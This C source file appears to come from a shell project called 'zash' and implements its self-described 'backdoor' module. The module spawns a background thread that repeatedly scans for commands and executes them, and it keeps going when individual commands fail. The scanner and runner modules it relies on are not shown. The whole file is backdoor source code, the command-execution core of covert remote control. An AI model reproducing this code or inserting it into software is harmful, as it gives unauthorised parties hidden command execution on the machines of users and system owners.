/**
 * @brief This module run the backdoor. the backdoor read commands and execute them.
 * @aouther Z.F
 * @date 18/3/2020
 */

/** Headers ***************************************************/
#include <stdlib.h>
#include <common.h>

#include "vector/vector.h"
#include "runner/runner.h"
#include "scanner/scanner.h"

#include "backdoor.h"
#include "backdoor_internal.h"


/** Functions ************************************************/
enum zash_status backdoor_run_commands(struct SCANNER_data **commands,
                                       size_t commands_amount,
                                       pthread_rwlock_t *lock)
{
    enum zash_status status = ZASH_STATUS_UNINITIALIZED;

    size_t i = 0;
    const char **argv = NULL;
    size_t argc = 0;

    /* Run all of the commands. */
    for (i = 0; i < commands_amount; ++i) {

        /* Get the arguments as an array */
        status = VECTOR_as_array(commands[i]->argv, (void ***)&argv, &argc);
        if (ZASH_STATUS_SUCCESS != status) {
            DEBUG_PRINT("status: %d", status);
            goto lbl_cleanup;
        }

        /* Run the current command. */
        status = RUNNER_run(commands[i]->id, argc, argv, lock);
        if (ZASH_STATUS_SUCCESS != status) {
            DEBUG_PRINT("status: %d", status);
            /* dont pass the error value - the backdoor
             * should continue even if a command has failed. */
        }

        HEAPFREE(argv);
    }

    /* Indicate Success */
    status = ZASH_STATUS_SUCCESS;

lbl_cleanup:

    return status;
}


enum zash_status backdoor_main_loop(struct BACKDOOR_context *context)
{
    enum zash_status status = ZASH_STATUS_UNINITIALIZED;
    enum zash_status temp_status = ZASH_STATUS_UNINITIALIZED;

    struct SCANNER_context *scanner = NULL;
    struct VECTOR_context *commands = NULL;
    struct SCANNER_data **commands_array = NULL;
    size_t commands_size = 0;


    /* Check for valid parameters */
    if (NULL == context) {
        status = ZASH_STATUS_BACKDOOR_MAIN_LOOP_NULL_POINTER;
        DEBUG_PRINT("status: %d", status);
        goto lbl_cleanup;
    }

    /* Create a scanner to scan for commands */
    status = SCANNER_create(&scanner);
    if (ZASH_STATUS_SUCCESS != status) {
        DEBUG_PRINT("status: %d", status);
        goto lbl_cleanup;
    }

    /* Until we should stop, scan for commands and run them. */
    while (false == context->should_stop) {

        /* Scan for new commands to run */
        status = SCANNER_scan(scanner, &commands);
        if (ZASH_STATUS_SUCCESS != status) {
            DEBUG_PRINT("status: %d", status);
            goto lbl_cleanup;
        }

        /* Get the commands as an array */
        status = VECTOR_as_array(commands, (void ***)&commands_array, &commands_size);
        if (ZASH_STATUS_SUCCESS != status) {
            DEBUG_PRINT("status: %d", status);
            goto lbl_cleanup;
        }

        /* Run all commands found */
        status = backdoor_run_commands(commands_array, commands_size, context->lock);
        if (ZASH_STATUS_SUCCESS != status) {
            DEBUG_PRINT("status: %d", status);
            goto lbl_cleanup;
        }

        HEAPFREE(commands_array);

        /* Free the commands vector */
        status = VECTOR_destroy(commands, (VECTOR_free_func_t) SCANNER_free_data);
        if (ZASH_STATUS_SUCCESS != status) {
            DEBUG_PRINT("status: %d", status);
            goto lbl_cleanup;
        }
        commands = NULL;

    }

    /* Indicate Success */
    status = ZASH_STATUS_SUCCESS;

lbl_cleanup:

    HEAPFREE(commands_array);

    /* Destroy the scanner created */
    if (NULL != scanner) {
        temp_status = SCANNER_destroy(scanner);
        ZASH_UPDATE_STATUS(status, temp_status);
    }
    scanner = NULL;

    /* Destroy the vector contains commands */
    if (NULL != commands) {
        temp_status = VECTOR_destroy(commands, (VECTOR_free_func_t) SCANNER_free_data);
        ZASH_UPDATE_STATUS(status, temp_status);
    }

    return status;
}


enum zash_status BACKDOOR_create(pthread_rwlock_t *lock, struct BACKDOOR_context **context)
{

    enum zash_status status = ZASH_STATUS_UNINITIALIZED;

    struct BACKDOOR_context *temp_context = NULL;

    /* Check for valid parameters */
    if ((NULL == context) || (NULL == lock)) {
        status = ZASH_STATUS_BACKDOOR_CREATE_NULL_POINTER;
        DEBUG_PRINT("status: %d", status);
        goto lbl_cleanup;
    }

    /* Allocate memory for new context */
    temp_context = HEAPALLOCZ(sizeof(*temp_context));
    if (NULL == temp_context) {
        status = ZASH_STATUS_BACKDOOR_CREATE_CALLOC_FAILED;
        DEBUG_PRINT("status: %d", status);
        goto lbl_cleanup;
    }

    /* Initialize fields */
    temp_context->lock = lock;
    temp_context->should_stop = false;
    temp_context->is_thread_running = false;

    /* Transfer Ownership */
    *context = temp_context;
    temp_context = NULL;

    /* Indicate Success */
    status = ZASH_STATUS_SUCCESS;

lbl_cleanup:

    HEAPFREE(temp_context);

    return status;
}


enum zash_status BACKDOOR_run(struct BACKDOOR_context *context)
{

    enum zash_status status = ZASH_STATUS_UNINITIALIZED;

    int ptrhead_return_value = C_STANDARD_FAILURE_VALUE;

    /* Check for valid parameters */
    if (NULL == context) {
        status = ZASH_STATUS_BACKDOOR_RUN_NULL_POINTER;
        DEBUG_PRINT("status: %d", status);
        goto lbl_cleanup;
    }

    /* Run the backdoor in a new thread. */
    ptrhead_return_value = pthread_create(&context->thread_id,
                                          NULL,
                                          (backdoor_pthread_func_t) backdoor_main_loop,
                                          context);
    if (C_STANDARD_FAILURE_VALUE == ptrhead_return_value) {
        status = ZASH_STATUS_BACKDOOR_RUN_PTHREAD_CREATE_FAILED;
        DEBUG_PRINT("status: %d", status);
        goto lbl_cleanup;
    }

    /* the new thread is now running. */
    context->is_thread_running = true;

    /* Indicate Success */
    status = ZASH_STATUS_SUCCESS;

lbl_cleanup:

    return status;
}


enum zash_status BACKDOOR_destroy(struct BACKDOOR_context *context)
{

    enum zash_status status = ZASH_STATUS_UNINITIALIZED;
    enum zash_status temp_status = ZASH_STATUS_UNINITIALIZED;

    enum zash_status backdoor_main_loop_return_value = ZASH_STATUS_UNINITIALIZED;
    int ptrhead_return_value = C_STANDARD_FAILURE_VALUE;

    /* if the backdoor is running, stop it. */
    if ((NULL != context) && (true == context->is_thread_running)) {

        /* Make the thread main loop to stop. */
        context->should_stop = true;

        /* wait for the thread to end. */
        ptrhead_return_value = pthread_join(context->thread_id,
                                            (void **) &backdoor_main_loop_return_value);
        if (C_STANDARD_FAILURE_VALUE == ptrhead_return_value) {
            temp_status = ZASH_STATUS_BACKDOOR_DESTROY_PTHREAD_JOIN_FAILED;
            DEBUG_PRINT("status: %d", temp_status);
            ZASH_UPDATE_STATUS(status, temp_status);
        }
        else if (ZASH_STATUS_SUCCESS != backdoor_main_loop_return_value) {
            DEBUG_PRINT("status: %d", backdoor_main_loop_return_value);
            ZASH_UPDATE_STATUS(status, backdoor_main_loop_return_value);
        }

    }
    HEAPFREE(context);

    /* If no error status was set, indicate success */
    ZASH_UPDATE_STATUS(status, ZASH_STATUS_SUCCESS);

    return status;
}


